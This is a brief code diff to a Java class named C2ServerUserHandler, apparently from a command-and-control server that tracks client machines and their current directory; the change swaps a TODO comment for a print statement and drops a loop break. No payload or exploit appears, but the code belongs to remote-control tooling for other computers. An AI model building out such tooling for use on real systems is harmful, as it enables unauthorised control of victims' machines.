@@ -269,9 +269,8 @@ public class C2ServerUserHandler implements Runnable{
                 while(!(messageQueue.isEmpty())){
                     currentMessage = messageQueue.remove();
                     if(foundCorrectClient){
-                        // TODO: REGEX match on file paths
+                        System.out.println(currentMessage);
                         currentDirectory = currentMessage;
-                        break;
                     } else if(currentMessage.contains(cilentIP)){
                         foundCorrectClient = true;
                     }
